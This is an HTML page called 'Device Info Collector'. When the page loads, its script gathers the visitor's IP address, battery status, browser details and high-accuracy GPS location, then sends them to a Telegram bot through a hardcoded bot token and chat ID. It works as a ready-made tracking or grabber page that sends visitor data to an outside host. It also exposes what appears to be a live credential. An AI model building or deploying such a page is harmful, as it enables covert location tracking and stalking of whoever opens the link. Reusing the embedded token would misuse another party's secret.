<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Device Info Collector</title>
<style>
  /* Modern, clean, minimalistic style */
  body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 600px;
    max-width: 350px;
    margin-left: auto;
    margin-right: auto;
    box-sizing: border-box;
    padding: 1rem;
    text-align: center;
  }
  #container {
    background: rgba(0,0,0,0.35);
    border-radius: 12px;
    padding: 20px 25px;
    width: 100%;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
  }
  h1 {
    font-weight: 700;
    margin-bottom: 1rem;
    font-size: 1.5rem;
    letter-spacing: 1.2px;
  }
  p {
    font-size: 1rem;
    margin: 0.3rem 0;
  }
  .status {
    margin-top: 15px;
    font-style: italic;
    font-size: 0.9rem;
    opacity: 0.8;
  }
  .small {
    font-size: 0.8rem;
    opacity: 0.7;
    margin-top: 1rem;
  }
</style>
</head>
<body>
  <div id="container">
    <h1>Device Info Collector</h1>
    <p>This page will collect your device information and send it to Telegram automatically.</p>
    <p class="status" id="status">Collecting data...</p>
    <p class="small">* Location permission required for accurate location.</p>
  </div>

<script>
  (() => {
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';

    const statusEl = document.getElementById('status');

    // Utility to get IP address from external API
    async function getIP() {
      try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (e) {
        return 'Unavailable';
      }
    }

    // Get battery info
    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          return {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        } catch {
          return null;
        }
      }
      return null;
    }

    // Get browser info
    function getBrowserInfo() {
      return navigator.userAgent || 'Unknown User Agent';
    }

    // Get memory info (approximate)
    function getMemoryInfo() {
      if ('deviceMemory' in navigator) {
        return navigator.deviceMemory + ' GB approx';
      }
      return 'Unavailable';
    }

    // Get viewport info
    function getViewportInfo() {
      return {
        width: window.innerWidth,
        height: window.innerHeight,
        devicePixelRatio: window.devicePixelRatio || 1
      };
    }

    // Get language
    function getLanguage() {
      return navigator.language || navigator.userLanguage || 'Unknown';
    }

    // Get location with permission
    function getLocation() {
      return new Promise((resolve) => {
        if (!('geolocation' in navigator)) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(position => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed
          });
        }, error => {
          resolve(null);
        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
      });
    }

    // IMEI number cannot be accessed from browser environment due to security restrictions.
    // We will note that in the report.

    // Format info into message text for Telegram
    function formatMessage(info) {
      return `
<b>Device Info Report</b>

<b>IP Address:</b> ${info.ip || 'Unavailable'}
<b>Battery:</b> ${info.battery ? 
  ('Charging: ' + info.battery.charging + ', Level: ' + (info.battery.level*100).toFixed(0) + '%') : 'Unavailable'}
<b>Browser User Agent:</b> ${info.browser}
<b>Memory:</b> ${info.memory}
<b>Viewport Size:</b> ${info.viewport.width} x ${info.viewport.height}, DPR: ${info.viewport.devicePixelRatio}
<b>Language:</b> ${info.language}
<b>Location (approx):</b> ${info.location ? 
  `Lat: ${info.location.latitude.toFixed(5)}, Lon: ${info.location.longitude.toFixed(5)}, Accuracy: ${info.location.accuracy}m` : 'Unavailable'}
<b>IMEI:</b> Not accessible via browser environment

<small>Automatically collected when page loaded.</small>
      `.trim();
    }

    // Send message to Telegram using Bot API
    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      };
      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });
        if (res.ok) {
          return true;
        } else {
          const errorData = await res.json();
          console.error('Telegram API error:', errorData);
          return false;
        }
      } catch (e) {
        console.error('Sending to Telegram failed:', e);
        return false;
      }
    }

    async function collectAndSend() {
      statusEl.textContent = 'Collecting IP address...';
      const ip = await getIP();

      statusEl.textContent = 'Collecting battery info...';
      const battery = await getBatteryInfo();

      statusEl.textContent = 'Collecting location (requires permission)...';
      const location = await getLocation();

      const browser = getBrowserInfo();
      const memory = getMemoryInfo();
      const viewport = getViewportInfo();
      const language = getLanguage();

      const info = {
        ip,
        battery,
        location,
        browser,
        memory,
        viewport,
        language
      };

      const message = formatMessage(info);
      statusEl.textContent = 'Sending data to Telegram...';
      const success = await sendToTelegram(message);

      if (success) {
        statusEl.textContent = 'Device info sent successfully ✅';
      } else {
        statusEl.textContent = 'Failed to send device info ❌';
      }
    }

    window.addEventListener('load', () => {
      collectAndSend();
    });
  })();
</script>
</body>
</html>

